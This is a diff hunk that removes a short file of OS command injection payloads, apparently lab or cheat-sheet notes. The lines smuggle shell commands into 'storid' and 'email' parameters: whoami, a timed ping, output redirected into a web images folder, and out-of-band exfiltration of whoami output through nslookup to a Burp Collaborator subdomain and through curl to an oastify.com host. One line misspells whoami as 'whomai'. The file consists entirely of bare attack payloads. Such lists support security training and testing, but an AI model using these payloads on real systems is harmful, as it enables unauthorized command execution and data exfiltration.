@@ -1,7 +1,0 @@
-storid=1 ; whomai
-storid= 1 | whoami
-email=x||ping+-c+10+127.0.0.1||
-email=||whoami>/var/www/images/output.txt||			//Blind OS command injection with output redirection
-email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
-email=x||curl+http://ehz2g0r2zgoirolnmagql5jaj1psdk19.oastify.com/?id=$(whoami) ||
-email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
